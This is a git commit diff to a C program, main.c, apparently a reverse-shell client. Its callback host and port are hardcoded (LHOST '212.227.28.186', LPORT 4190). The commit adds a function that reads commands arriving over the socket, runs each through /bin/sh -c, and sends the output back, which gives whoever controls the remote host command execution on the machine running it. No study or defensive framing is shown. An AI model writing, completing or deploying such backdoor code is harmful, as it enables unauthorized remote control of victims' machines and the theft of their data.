5dbb7b5ce2efd699596accfdfa529821f0f9ae56
54u63 <antoine.boury1@gmail.com>
2025-08-12 16:35:28 +0200

    working but lots of fix to do

--- main.c
+++ main.c
@@ -5,6 +5,9 @@
 #include <arpa/inet.h>
 #include <errno.h>
 #include <string.h>
+#include <sys/wait.h>
+
+
 
 #define LPORT 4190
 #define LHOST "212.227.28.186"
@@ -24,9 +27,71 @@ int checkEnd(char* buffer, size_t size){
 
 }
 
+int exec_command(const char *cmd, char **output, size_t *out_size) {
+    int pipefd[2];
+    pid_t pid;
+    *output = NULL;
+    size_t size = 0;
+
+    if (pipe(pipefd) == -1) {
+        perror("pipe");
+        return -1;
+    }
+
+    pid = fork();
+    if (pid == -1) {
+        perror("fork");
+        close(pipefd[0]);
+        close(pipefd[1]);
+        return -1;
+    }
+
+    if (pid == 0) {
+        // Processus enfant
+        close(pipefd[0]);                // Ferme lecture du pipe
+        dup2(pipefd[1], STDOUT_FILENO);   // Redirige stdout vers pipe
+        close(pipefd[1]);
+
+        char *argv[] = {"/bin/sh", "-c", (char *)cmd, NULL};
+        execvp(argv[0], argv);
+        perror("execvp");
+        _exit(1);
+    } else {
+        // Processus parent
+        close(pipefd[1]);
+
+        char buf[1024];
+        ssize_t bytes;
+        while ((bytes = read(pipefd[0], buf, sizeof(buf))) > 0) {
+            char *tmp = realloc(*output, size + bytes + 1);
+            if (!tmp) {
+                perror("realloc");
+                free(*output);
+                close(pipefd[0]);
+                waitpid(pid, NULL, 0);
+                return -1;
+            }
+            *output = tmp;
+            memcpy(*output + size, buf, bytes);
+            size += bytes;
+            (*output)[size] = '\0';
+        }
+
+        close(pipefd[0]);
+        int status;
+        waitpid(pid, &status, 0);
+        if (out_size) {
+            *out_size = size;
+        }
+        return WIFEXITED(status) ? WEXITSTATUS(status) : -1;
+    }
+}
+
 int iterationLoop(int sockfd){
   char* cmd = (char*)malloc(BUFFLEN); //buffer storing the entire command line
   char* chunk = (char*)malloc(BUFFLEN); //buffer storing the chunk
+  char* retValue = (char*)malloc(BUFFLEN);
+  size_t retSize = 0;
   int end = 0; //Value stoping the iteration loop 
   int out = 0;
   int bRead = 0;
@@ -67,8 +132,13 @@ int iterationLoop(int sockfd){
         memcpy(cmd + cmdLen, chunk, bRead);
         cmdLen += bRead;
     }
+    if (exec_command(cmd,&retValue,&retSize)!=0){
+      perror("exec_command");
+      out+=1;
+      goto _GracefullEnd;
+    }
 
-    write(sockfd,cmd,cmdLen);
+    write(sockfd,retValue,retSize);
 
     cmdLen = 0; // prêt pour la commande suivante
 
